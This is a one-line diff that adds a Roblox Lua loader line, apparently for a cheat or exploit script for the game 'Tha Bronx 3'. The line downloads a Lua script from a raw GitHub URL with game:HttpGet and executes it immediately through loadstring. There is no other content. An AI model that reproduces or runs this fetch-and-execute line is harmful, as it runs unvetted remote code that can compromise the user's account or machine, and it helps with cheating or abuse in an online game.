@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/tha-bronx-3-spam0-h9j25if4joouhk.lua"))()
